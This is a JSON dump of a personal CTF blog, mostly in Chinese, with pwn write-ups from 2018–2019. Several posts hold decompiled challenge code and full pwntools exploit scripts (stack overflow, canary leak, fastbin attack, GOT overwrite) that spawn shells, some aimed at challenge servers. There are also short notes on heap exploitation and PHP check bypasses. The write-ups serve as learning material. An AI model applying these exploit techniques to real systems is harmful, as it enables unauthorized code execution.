{"meta":{"title":"Room of Requirement","subtitle":"pwn what you want","description":"pwn菜鸡一枚","author":"Sirius Whiter","url":"http://siriuswhiter.tk"},"pages":[{"title":"About Me","date":"2018-08-24T04:15:58.000Z","updated":"2018-08-24T05:21:32.074Z","comments":true,"path":"about/index.html","permalink":"http://siriuswhiter.tk/about/index.html","excerpt":"","text":"I’m Sirius Whiter,a sophomore at CUG,pwn noob.Bosses do light spray.contact me at github:siriuswhiterFor the pwn is long and full of terrors"},{"title":"categories","date":"2018-08-24T04:17:06.000Z","updated":"2018-09-25T13:27:02.130Z","comments":true,"path":"categories/index.html","permalink":"http://siriuswhiter.tk/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-25T12:54:31.000Z","updated":"2018-09-25T13:09:27.033Z","comments":true,"path":"tags/index-1.html","permalink":"http://siriuswhiter.tk/tags/index-1.html","excerpt":"","text":"skills pwn RE"},{"title":"archives","date":"2018-08-24T04:17:49.000Z","updated":"2018-08-24T04:17:49.342Z","comments":true,"path":"archives/index.html","permalink":"http://siriuswhiter.tk/archives/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-24T04:16:44.000Z","updated":"2018-09-25T13:26:11.605Z","comments":true,"path":"tags/index.html","permalink":"http://siriuswhiter.tk/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"护网杯pwn复现","slug":"护网杯pwn复现","date":"2019-02-15T04:42:46.000Z","updated":"2019-02-20T09:47:55.997Z","comments":true,"path":"2019/02/15/护网杯pwn复现/","link":"","permalink":"http://siriuswhiter.tk/2019/02/15/护网杯pwn复现/","excerpt":"","text":"huwang题目表面是个堆题，但实际上是个栈溢出。。。 给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119void __noreturn guess()&#123; int v0; // ST04_4 __int64 v1; // [rsp+0h] [rbp-80h] __int64 v2; // [rsp+0h] [rbp-80h] signed int i; // [rsp+0h] [rbp-80h] int v4; // [rsp+4h] [rbp-7Ch] int fd; // [rsp+8h] [rbp-78h] int rand; // [rsp+8h] [rbp-78h] int max_cnt; // [rsp+Ch] [rbp-74h] char v8; // [rsp+10h] [rbp-70h] char s[32]; // [rsp+20h] [rbp-60h] char s1; // [rsp+40h] [rbp-40h] char name; // [rsp+60h] [rbp-20h] unsigned __int64 v12; // [rsp+78h] [rbp-8h] v12 = __readfsqword(0x28u); puts(&quot;please input your name&quot;); read(0, &amp;name, 0x20uLL); memset(s, 0, 0x10uLL); puts(&quot;Do you want to guess the secret?&quot;); get_str(&amp;v8, 2LL); if ( v8 == &apos;y&apos; ) &#123; if ( access(&quot;/tmp/secret&quot;, 0) == -1 ) &#123; HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, s, 0xCuLL); LODWORD(v1) = 0; while ( (signed int)v1 &lt;= 11 ) &#123; s[(signed int)v1] &amp;= 1u; LODWORD(v1) = v1 + 1; &#125; write(SHIDWORD(v1), s, 0xCuLL); close(SHIDWORD(v1)); close(fd); &#125; v0 = open(&quot;/tmp/secret&quot;, 0, v1); read(v0, s, 0xCuLL); close(v0); puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;); max_cnt = input_0x10(); if ( max_cnt &gt; 10 ) &#123; puts(&quot;What? Why do you need to encrypt so many times?&quot;); exit(-1); &#125; if ( !max_cnt ) &#123; printf(&quot;At least encrypt one time&quot;, s); exit(-1); &#125; HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513); LODWORD(v2) = 0; while ( (unsigned int)v2 &lt; max_cnt ) &#123; MD5((__int64)s, 16LL, (__int64)s); LODWORD(v2) = v2 + 1; &#125; write(SHIDWORD(v2), s, 0x10uLL); close(SHIDWORD(v2)); puts(&quot;Try to guess the md5 of the secret&quot;); read(0, &amp;s1, 0x10uLL); if ( !memcmp(&amp;s1, s, 0x10uLL) ) secret((__int64)&amp;name); v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2); rand = open(&quot;/dev/urandom&quot;, 0); read(rand, s, 0xCuLL); for ( i = 0; i &lt;= 11; ++i ) s[i] &amp;= 1u; write(v4, s, 0xCuLL); close(v4); close(rand); exit(0); &#125; printf(&quot;Oh!bye %s\\n&quot;, &amp;name); exit(0);&#125;int __fastcall secret(__int64 name)&#123; char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char occ; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf(&quot;Congratulations, %s guessed my secret!\\n&quot;, name); puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;); puts(&quot;What`s your occupation?&quot;); get_str(&amp;occ, 0xFFLL); v3 = snprintf( &amp;s, 0xFFuLL, &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot; &quot;.................................................................................................&quot;, name, &amp;occ); puts(&quot;Here is your introduce&quot;); puts(&amp;s); puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;); v1 = getchar(); getchar(); if ( v1 == &apos;Y&apos; ) read(0, &amp;s, v3 - 1); return printf(&quot;The final presentation is as follows:%s\\n&quot;, &amp;s);&#125; 看一下保护，除了PIE其他的都开了 分析secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了： 程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。 而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。 因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。 ps： 但是感觉后面的栈布局有点奇怪，之后再看一看 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level=&apos;debug&apos;sh = process(&apos;./huwang&apos;)def six(name,rd,secret,flag=1): sh.recvuntil(&apos;&gt;&gt; \\n&apos;) sh.sendline(&apos;666&apos;) sh.recvuntil(&apos;name\\n&apos;) sh.send(name) sh.recvuntil(&apos;secret?\\n&apos;) sh.sendline(&apos;y&apos;) sh.recvuntil(&apos;secret:\\n&apos;) sh.sendline(str(rd)) if flag == 1: sh.recvuntil(&apos;secret\\n&apos;) sh.send(secret)six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)sh.recvuntil(&apos;timeout~&apos;)sh = process(&apos;./huwang&apos;)libc = ELF(&apos;./libc.so.6&apos;)six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))sh.recvuntil(&apos;a&apos;*0x19)canary = u64(&apos;\\x00&apos;+sh.recvn(7))print &apos;canary: &apos;+hex(canary)sh.recvuntil(&apos;occupation?\\n&apos;)sh.send(&apos;a&apos; * 0xff)sh.recvuntil(&apos;[Y/N]\\n&apos;)sh.sendline(&apos;Y&apos;)#gdb.attach(sh)shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C) sh.send(shellcode)gdb.attach(sh)sh.recvuntil(&apos;Congratulations, &apos;)libc_addr = u64(sh.recvn(6) + &apos;\\x00&apos; * 2) - libc.symbols[&apos;puts&apos;]sh.recvuntil(&apos;occupation?\\n&apos;)sh.send(&apos;a&apos; * 0xff)sh.recvuntil(&apos;[Y/N]\\n&apos;)sh.sendline(&apos;Y&apos;)shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])sh.send(shellcode)sh.interactive() calendar题目选项题 add edit delete ，但是没有show函数 add 最多可以控制四个chunk，申请最大size为0x68 edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容 delete 只有free，存在UAF 程序在输入字符串时的get_str函数存在off-by-one漏洞 1for ( i = 0; (signed int)i &lt;= len; ++i ) // off by one 题目提示house of roman 分析刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Pwn Heap leak addr && getshell","slug":"pwn-heap-leak-addr-getshell","date":"2019-02-14T05:37:18.000Z","updated":"2019-02-14T06:09:12.063Z","comments":true,"path":"2019/02/14/pwn-heap-leak-addr-getshell/","link":"","permalink":"http://siriuswhiter.tk/2019/02/14/pwn-heap-leak-addr-getshell/","excerpt":"","text":"在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法： Leak Addressheap base 最常用的即在存在UAF或溢出之类的条件下，因为fastbin 在内存中为单链存放，之后释放的fastbin范围的chunk的fd指针会指向之前释放的等大小范围的chunk，泄露fd指针即可得到heap base main arena中存放着top chunk的地址，如果有条件泄露其地址便可以得到heap base libc base unsorted bin为双向链表，而第一个unsorted bin的fd 与 bk指针都指向main_arena+88 处，泄露指针处即可计算得到libc base stack addr 一般在可以得到libc base的情况下，可以利用libc中存放的_environ指针，该指针指向栈中环境变量的位置，泄露该指针的值便可以得到栈地址 Get Shellwrite to .plt.got当程序保护中got表不满时 即 ： RELRO: Partial RELRO 。此时got表可写，可以将某个函数的got地址改写为system()函数的地址，然后想办法将’/bin/sh’传参进去，get shell write to malloc_hook or free_hookmalloc_hook &amp;&amp; free_hook 是程序在调用malloc或free时会首先检查的地方，如果不为空，会先执行其指针指向的地方，所以如果将one_gadget或system(‘/bin/sh’)的地址写向该地址，便可以 get shell write to stack一般来说，这个真的是没有办法的话才用，利用上面的方法得到栈地址后，利用漏洞将one_gadget或system(‘/bin/sh’)的地址写向返回地址，这样程序在退出时便会getshell","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"l3c-sec Pwn Recruit New Questions","slug":"l3c-sec-pwn-recruit-new-questions","date":"2019-02-12T11:52:35.000Z","updated":"2019-02-20T09:12:39.558Z","comments":true,"path":"2019/02/12/l3c-sec-pwn-recruit-new-questions/","link":"","permalink":"http://siriuswhiter.tk/2019/02/12/l3c-sec-pwn-recruit-new-questions/","excerpt":"","text":"华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题 stack最简单的栈溢出 exp1234567891011from pwn import *#sh = process(&apos;./stack&apos;)sh =remote(&apos;159.65.68.241&apos;,&apos;10003&apos;)sys_addr = 0x80491e2pay = &apos;a&apos;*0x3a +&apos;bbbb&apos;+p32(sys_addr)sh.sendline(pay)sh.interactive() store题目选项题，功能有add,read,sell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 保护： RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)int add_book()&#123; size_t size; // [rsp+8h] [rbp-8h] for ( HIDWORD(size) = 0; HIDWORD(size) &lt;= 0xF &amp;&amp; ptr[5 * HIDWORD(size)]; ++HIDWORD(size) ) ; if ( HIDWORD(size) == 16 ) puts(&quot;Too many books&quot;); puts(&quot;What is the author name?&quot;); readn(0x28LL * HIDWORD(size) + 0x602060, 0x1F); puts(&quot;How long is the book name?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;size); if ( (unsigned int)size &gt; 0x50 ) return puts(&quot;Too big!&quot;); ptr[5 * HIDWORD(size)] = malloc((unsigned int)size); puts(&quot;What is the name of the book?&quot;); readn(ptr[5 * HIDWORD(size)], size); // size==0 时，溢出 return puts(&quot;Done!&quot;);&#125;// 漏洞函数__int64 __fastcall readn(__int64 a1, int len)&#123; __int64 result; // rax unsigned int v3; // eax unsigned __int8 buf; // [rsp+1Bh] [rbp-5h] unsigned int v5; // [rsp+1Ch] [rbp-4h] v5 = 0; while ( 1 ) &#123; result = (unsigned int)(len - 1); if ( (unsigned int)result &lt;= v5 ) break; read(0, &amp;buf, 1uLL); result = buf; if ( buf == &apos;\\n&apos; ) break; v3 = v5++; *(_BYTE *)(a1 + v3) = buf; &#125; return result;&#125;int sellbook()&#123; unsigned int idx; // [rsp+Ch] [rbp-4h] puts(&quot;Which book do you want to sell?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;idx); if ( idx &gt; 0x10 ) return puts(&quot;Out of bound!&quot;); if ( !ptr[5 * idx] ) // ptr as inuse return puts(&quot;No such book!&quot;); free((void *)ptr[5 * idx]); ptr[5 * idx] = 0LL; // ptr=0 return puts(&quot;Done!&quot;);&#125;int readbook()&#123; unsigned int idx; // [rsp+Ch] [rbp-4h] puts(&quot;Which book do you want to sell?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;idx); if ( idx &gt; 0x10 ) return puts(&quot;Out of bound!&quot;); if ( ptr[5 * idx] ) // 检查ptr return printf(&quot;Author:%s\\nBookname:%s\\n&quot;, 0x28LL * idx + 0x602060, ptr[5 * idx]); -&gt;%s泄漏信息 return puts(&quot;No such book!&quot;);&#125; 分析在输入size为0时readn函数漏洞，此时可以输入无限长度，可以溢出。结合readbook函数可以泄露堆地址； fastbin attack将chunk分配到bss段存储指针及author name的地方，修改指针为某一函数got地址计算得到libc基址。 之后就需要getshell了，想法有： 写got表，但是full relro，所以不行； 复写malloc_hook或free_hook,这个尝试了半天，因为在malloc_hook附近分配时需要用0x7f绕过大小检查，但是用户自己申请的大小最大为0x50，最终size最大便是0x60，于是想直接在bss段伪造0x70大小的chunk，并free掉，但是坑爹的是bss段一共就只有0x7f大小。。。最终放弃； 无奈之下，尝试将chunk分配到栈中覆盖返回地址，终于getshell！！ exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *context.log_level=&apos;debug&apos;#sh= process(&apos;./book&apos;)#[&apos;./book&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)sh =remote(&apos;159.65.68.241&apos;,&apos;10004&apos;)elf = ELF(&apos;./book&apos;)libc = ELF(&apos;libc-2.23.so&apos;)def add(a_name,size,b_name): sh.recvuntil(&apos;Your choice:\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;author name?\\n&apos;) sh.sendline(a_name) sh.recvuntil(&apos;book name?\\n&apos;) sh.sendline(str(size)) sh.recvuntil(&apos;book?\\n&apos;) sh.sendline(b_name)def read(idx): sh.recvuntil(&apos;Your choice:\\n&apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;sell?\\n&apos;) sh.sendline(str(idx))def delete(idx): sh.recvuntil(&apos;Your choice:\\n&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;sell?\\n&apos;) sh.sendline(str(idx))add(&apos;a&apos;,0,&apos;b&apos;)add(&apos;c&apos;,0,&apos;d&apos;)add(&apos;e&apos;,0,&apos;f&apos;)add(&apos;g&apos;,0,&apos;h&apos;)add(&apos;i&apos;,0,&apos;j&apos;)#--------leak heap_base-----------------#delete(2)delete(1)delete(0)add(p64(0)+p64(0x21),0,&apos;b&apos;*0x20)read(0)sh.recvuntil(&apos;b&apos;*0x20)heap_base = u64(sh.recvuntil(&apos;\\n&apos;).strip(&apos;\\n&apos;).ljust(8,&apos;\\x00&apos;))-0x40print &apos;heap_base : &apos;+hex(heap_base)#gdb.attach(sh)#---------fastbin_attack leak libc_base-----------------#delete(4)delete(3)add(&apos;A&apos;,0,&apos;b&apos;*0x10+p64(0)+p64(0x21)+p64(0x602060))add(&apos;f&apos;,0,&apos;wwwwwwww&apos;)add(&apos;a&apos;,0,&apos;a&apos;*0x10+p64(elf.got[&apos;puts&apos;]))#gdb.attach(sh)read(0)sh.recvuntil(&apos;name:&apos;)puts_got = u64(sh.recvuntil(&apos;\\n&apos;).strip(&apos;\\n&apos;).ljust(8,&apos;\\x00&apos;))libc_base = puts_got- libc.symbols[&apos;puts&apos;]print &apos;libc_base : &apos;+hex(libc_base) environ_ptr_addr = libc_base + libc.symbols[&apos;_environ&apos;]print &apos;environ_ptr_addr : &apos;+ hex(environ_ptr_addr)#gdb.attach(sh)#---------get shell-------------------------------#one_gadget_off = 0x45216one_gadget_addr = one_gadget_off + libc_basemalloc_hook_addr = libc_base + 0x3c4b10delete(3)add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(environ_ptr_addr))read(0)sh.recvuntil(&apos;name:&apos;)environ_addr = u64(sh.recvuntil(&apos;\\n&apos;).strip(&apos;\\n&apos;).ljust(8,&apos;\\x00&apos;))rbp_addr = environ_addr-0xf8print &apos;one_gadget_addr : &apos;+hex(one_gadget_addr)print &apos;malloc_hook_addr : &apos;+hex(malloc_hook_addr)print &apos;rbp_addr : &apos;+hex(rbp_addr)delete(3)add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+&apos;c&apos;*0x20+p64(0x6020b0)+&apos;d&apos;*0x10+p64(0x21))delete(2)delete(0)#gdb.attach(sh)add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+p64(rbp_addr-0x1e))#gdb.attach(sh)add(&apos;\\n&apos;,0x30,&apos;\\n&apos;)#gdb.attach(sh)add(&apos;c&apos;,0x30,&apos;a&apos;*0x16+p64(one_gadget_addr))#gdb.attach(sh)sh.sendline(&apos;4&apos;)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Fun with PHP Code Audit","slug":"fun-with-php-code-audit","date":"2019-01-31T07:47:31.000Z","updated":"2019-01-31T08:07:35.604Z","comments":true,"path":"2019/01/31/fun-with-php-code-audit/","link":"","permalink":"http://siriuswhiter.tk/2019/01/31/fun-with-php-code-audit/","excerpt":"","text":"pwn的头疼＋心累，玩一玩入门的PHP代码审计 基础传参从最基本的来说，常用的网页传参即 GET 与 POST对于用户来讲，GET传参就是往网页链接后面直接添加参数，比如说https://test.php?a=1;而POST传参一般需要写个脚本或者使用插件，比如说火狐浏览器的hackbar插件。 简单的PHP函数检测绕过 is_numeric: 检测是否为数字，但是如果输入 数字＋字母 （1ab）便能过检测，但是 php中 1ab ==1 为true extract： 从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 但一般若设置为空，则有希望通过判断 对于数字之间的比较，通常可以使用数组来绕过，比如说 strcmp，strpos，MD5 ，sha1 等对两个用户输入字符串比较的，都可以使用数组尝试","categories":[{"name":"web","slug":"web","permalink":"http://siriuswhiter.tk/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://siriuswhiter.tk/tags/web/"}]},{"title":"fireshell-2019-pwn","slug":"fireshell-2019-pwn","date":"2019-01-29T09:09:33.000Z","updated":"2019-02-08T06:52:36.780Z","comments":true,"path":"2019/01/29/fireshell-2019-pwn/","link":"","permalink":"http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/","excerpt":"","text":"本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭 leakless题目12char buf; // [esp+0h] [ebp-48h]return read(0, &amp;buf, 0x100u); 分析一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher. exp123456789101112131415161718192021222324from pwn import *from LibcSearcher import *context.log_level = &apos;debug&apos;sh = process(&apos;./leakless&apos;)libc = ELF(&apos;./leakless&apos;)pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])sh.sendline(pay)puts_got_addr = u32(sh.recv(4))print &quot;puts_got_addr: &quot;+hex(puts_got_addr)obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;) success( &quot;system_addr: &quot;+hex(system_addr))success(&quot;binsh_addr: &quot;+hex(binsh_addr))pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)#gdb.attach(sh)sh.sendline(pay)sh.interactive() casino题目用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。 1234seed = (unsigned int)time(0LL) / 10;seed += bet;(bet=1)srand(seed);rand(); 分析格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。 看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有： 单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； 使用python和c的混合编程包：ctypes。 经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错 exp 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from time import *context.log_level=&apos;debug&apos;now=int(time())/10+2sh=process(&quot;./timerand&quot;)####include&lt;stdio.h&gt;int main()&#123; int i; int seed; scanf(&quot;%d&quot;,&amp;seed); srand(seed); for(i = 0; i &lt; 100; i++) &#123; printf(&quot;%d &quot;,rand()); &#125; printf(&quot;\\n&quot;);&#125;###sh.sendline(str(now))rand=sh.recvuntil(&quot;\\n&quot;).strip().split(&quot; &quot;)print randsh.close()#sleep(0.5)#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)sh=process(&apos;./casino&apos;)sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))#gdb.attach(sh)for i in range(99): sh.sendlineafter(&quot;number: &quot;,rand[i])print sh.recv()sh.interactive() 123456789101112131415161718192021from pwn import *from ctypes import cdllsh = process(&quot;./casino&quot;)sh.recvuntil(&apos;What is your name? &apos;)sh.send(&quot;%8$p&quot;)sh.recvuntil(&apos;Welcome &apos;)seed =eval(sh.recvuntil(&apos;\\n&apos;,drop=True))&amp;0xffffffff &lt;--- 数据类型转换成int型print seedsh.close()seed += 3 &lt;----还是不清楚这个3怎么计算出来的，或许是因为两个程序打开具有延迟？？libc = cdll.LoadLibrary(&quot;&quot;) &lt;--- 突然发现这里为空也不影响？？libc.srand(seed)sh = process(&apos;./casino&apos;)pay = &apos;aaa%11$n&apos;+p64(0x602020)sh.recvuntil(&apos;What is your name? &apos;)sh.send(pay)for i in range(99): sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))sh.interactive() babyheap题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int create()&#123; int result; // eax buf = malloc(0x60uLL); result = puts(&quot;Done!&quot;); create_inuse = 1LL; return result;&#125;ssize_t edit()&#123; ssize_t result; // rax printf(&quot;Content? &quot;); result = read(0, buf, 0x40uLL); edit_inuse = 1LL; return result;&#125;int show()&#123; int result; // eax result = printf(&quot;Content: %s\\n&quot;, buf); show_inuse = 1LL; return result;&#125;int delete()&#123; int result; // eax free(buf); // UAF result = puts(&quot;Done!&quot;); create_inuse = 0LL; delete_inuse = 1LL; return result;&#125;__int64 fill()&#123; buf = malloc(0x60uLL); printf(&quot;Fill &quot;); read(0, buf, 0x40uLL); return fill_inuse++ + 1;&#125; 分析各项功能除了次数检查基本没有限制，所以在有限的步骤内将chunk分配到 123456.bss:00000000006020A0 create_inuse .bss:00000000006020A8 edit_inuse .bss:00000000006020B0 show_inuse .bss:00000000006020B8 delete_inuse .bss:00000000006020C0 fill_inuse .bss:00000000006020C8 ; void *buf 我们可以使用UAF漏洞＋fastbinattack达到目的，这样不仅消除了次数限制问题，同时可以随意修改指针所以之后便是先泄露libc基址，之后修改atoi.got表为system,输入’/bin/sh’即可 exp1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *context.log_level=&apos;debug&apos;def new(): sh.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)def edit(note): sh.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;) sh.sendafter(&quot;Content? &quot;,note)def delete(): sh.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)def show(): sh.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;) sh.recvuntil(&quot;Content: &quot;) return sh.recvuntil(&quot;\\n&quot;)def fill(note): sh.sendlineafter(&quot;&gt; &quot;,&quot;1337&quot;) sh.sendafter(&quot;Fill &quot;,note)sh=process(&quot;./babyheap&quot;)elf = ELF(&quot;./babyheap&quot;)libc = ELF(&quot;./libc.so.6&quot;)new()delete()edit(p64(0x602095-8))new()fill(&apos;/bin/sh&apos;+chr(0)+&apos;a&apos;*0x33+p64(0x602060)[0:3])#gdb.attach(p)sh.sendline(&apos;3&apos;)sh.recvuntil(&apos;Content: &apos;)libc_addr = u64(sh.recvuntil(&apos;\\n&apos;)[:-1].ljust(8,&apos;\\x00&apos;))-libc.plt[&apos;atoi&apos;]print &quot;libc_addr : &quot; + hex(libc_addr)#gdb.attach(p)system_addr = libc_addr + libc.plt[&apos;system&apos;]edit(p64(system_addr))sh.sendline(&apos;/bin/sh&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.8-HouseOfEinherjar","slug":"introduction-to-pwn2-8-houseofeinherjar","date":"2019-01-24T09:32:53.000Z","updated":"2019-01-25T06:55:36.870Z","comments":true,"path":"2019/01/24/introduction-to-pwn2-8-houseofeinherjar/","link":"","permalink":"http://siriuswhiter.tk/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/","excerpt":"","text":"House of Einherjar 原理感觉像是把好几种漏洞结合起来： off by one unlink （需要能够完全溢出到下一个堆来控制 chunk entend or shrink; 但是细节却不相同。 该利用需要： chunk能够覆盖next_chunk的pre_size并修改pre_inuse位 泄露地址使得unlink 检查pre_size与size时能够绕过 fake_chunk的fd 与 bk指针需要能够绕过检查 当我们能够覆盖nextchunk的pre_size位及pre_inuse位时，我们便可以伪造fake_chunk，之后在free next_chunk时，fake_chunk通过伪造便能绕过检查被置入bin中 Tinypad题目程序自己重写了许多write read函数主要功能 add edit delete 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108 do &#123; for ( i = 0; i &lt;= 3; ++i ) &#123; LOBYTE(c) = i + &apos;1&apos;; if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] ) &#123; v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]); writeln(*(char **)&amp;tinypad[16 * (i + 16LL) + 8], v3); &#125; writeln(&quot;\\n&quot;, 1LL); &#125; write_n( &quot;+- MENU -----------------------------------------------------------------------+\\n&quot; &quot;| [A] Add memo |\\n&quot; &quot;| [D] Delete memo |\\n&quot; &quot;| [E] Edit memo |\\n&quot; &quot;| [Q] Quit |\\n&quot; &quot;+------------------------------------------------------------------------------+\\n&quot;, 486LL); if ( cmd == &apos;D&apos; ) // delete &#123; write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL); idx = read_int(); if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 ) &#123; if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )// inuse &#123; free(*(void **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);// ptr *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] = 0LL; writeln(&quot;\\nDeleted.&quot;, 9LL); &#125; &#125; if ( cmd = &apos;E&apos; ) write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL); idx = read_int(); if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 ) &#123; if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] ) &#123; c = &apos;0&apos;; strcpy(tinypad, *(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]); while ( toupper(c) != &apos;Y&apos; ) &#123; write_n(&quot;CONTENT: &quot;, 9LL); v6 = strlen(tinypad); 